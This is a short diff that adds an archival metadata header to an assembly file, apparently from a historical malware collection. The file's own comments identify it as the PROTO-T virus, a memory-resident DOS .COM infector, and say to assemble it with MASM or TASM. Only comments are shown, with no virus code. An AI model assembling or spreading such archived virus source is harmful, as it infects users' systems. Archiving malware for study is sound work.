@@ -1,3 +1,14 @@
+; ------------------------------------------------------------
+; name      P
+; type      asm
+; cve       —
+; year      unknown
+; os        DOS
+; authors   unknown
+; source    krisyotam
+; archived  krisyotam (2026)
+; notes     —
+; ------------------------------------------------------------
 ;PROTO-T virus: a simple, memory resident .COM infector for
 ;Crypt newsletter 9. Assemble with any MASM/TASM compatible assembler.
 ;
